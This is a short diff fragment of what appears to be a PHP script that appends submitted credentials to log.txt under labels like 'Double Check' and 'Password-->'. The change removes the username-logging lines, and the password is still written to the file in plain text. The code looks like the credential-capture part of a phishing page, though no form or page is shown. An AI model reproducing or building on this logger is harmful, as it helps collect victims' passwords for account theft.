@@ -5,9 +5,6 @@
  
     $file = fopen("log.txt", "a");
     fwrite($file,"Double Check ");
-    fwrite($file,"\n------------------------\n");
-    fwrite($file,"Username--> : ");
-    fwrite($file,$uname);
     fwrite($file,"\n");
     fwrite($file,"Password--> : ");
     fwrite($file,$pass);
